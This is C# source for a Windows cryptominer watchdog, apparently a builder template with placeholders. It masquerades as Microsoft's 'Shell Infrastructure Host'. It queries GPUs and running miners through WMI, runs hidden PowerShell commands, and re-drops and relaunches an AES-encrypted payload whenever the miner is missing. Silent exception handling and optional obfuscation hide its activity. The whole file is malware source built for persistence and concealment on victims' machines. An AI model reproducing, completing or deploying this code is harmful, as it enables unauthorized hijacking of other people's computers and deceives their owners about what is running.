using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

public partial class _rWatchdog_
{
    private static byte[] _rxm_;
    private static int _rcheckcount_ = 0;
    private static string _rplp_ = PayloadPath;

    private static void Main()
    {
        try
        {
            _rWDLoop_();
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("WSE: " + Environment.NewLine + ex.ToString());
        }
#endif
    }

    private static void _rWDLoop_()
    {
        try
        {
            if (_rxm_ == null)
            {
                _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
            }

            string _rarg1_ = "";
            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
            foreach (ManagementObject _rMemObj_ in rarg6)
            {
                _rarg1_ += (" " + _rMemObj_["#STRVIDEOP"] + " " + _rMemObj_["#STRNAME"]);
            }

            bool _rarg2_ = _rarg1_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;

            string _rminers_ = "";
            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#MINERQUERY")).Get();
            foreach (ManagementObject _rMemObj_ in _rarg7_)
            {
                if (_rMemObj_ != null && _rMemObj_["#STRCMDLINE"] != null && _rMemObj_["#STRCMDLINE"].ToString().Contains("#MINERID"))
                {
                    _rminers_ += _rMemObj_["#STRCMDLINE"].ToString();
                }
            }

            string[][] _rminerset_ = new string[][] { MINERSET };
            bool _rmissing_ = false;
            foreach (string[] _set_ in _rminerset_)
            {
                if(!_rminers_.Contains(_set_[0]) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rarg2_)))
                {
                    _rmissing_ = true;
                    break;
                }
            }

            if (_rmissing_)
            {
                _rcheckcount_ += 1;
            }

            bool _rexists_ = File.Exists(_rplp_);
            if (!_rexists_ || (_rmissing_ && _rcheckcount_ > 2))
            {
                _rcheckcount_ = 0;
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "#SPOWERSHELL",
                        Arguments = "#WDCOMMANDS",
                        WorkingDirectory = Environment.SystemDirectory,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    }).WaitForExit();
                }
#if !DefDebug
                catch { }
#else
                catch (Exception ex)
                {
                    MessageBox.Show("WDE: " + Environment.NewLine + ex.ToString());
                }
#endif

                if (!_rexists_)
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                    File.WriteAllBytes(_rplp_, _rAESMethod_(_rxm_));
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = _rplp_,
                    WorkingDirectory = Path.GetDirectoryName(_rplp_),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });

            }
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("WLE: " + Environment.NewLine + ex.ToString());
        }
#endif
        Thread.Sleep(startDelay * 1000 + 10000);
        _rWDLoop_();
    }

#if DefObfuscate
    private static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }
#endif

    private static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
#if DefObfuscate
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
#else
        return _rinput_;
#endif
    }
}